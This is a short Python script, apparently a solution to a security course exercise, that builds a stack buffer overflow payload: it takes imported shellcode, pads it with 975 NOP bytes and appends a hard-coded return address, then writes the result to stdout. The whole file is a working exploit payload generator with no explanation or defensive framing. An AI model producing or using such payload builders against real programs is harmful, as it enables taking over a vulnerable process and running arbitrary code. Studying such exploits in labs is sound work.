from shellcode import shellcode
import sys

ret_add = b"\xc8\x85\xf6\xff"


#Shellcode is 53 chars long
shellcode += b"\x90" * 975
shellcode += ret_add

sys.stdout.buffer.write(shellcode)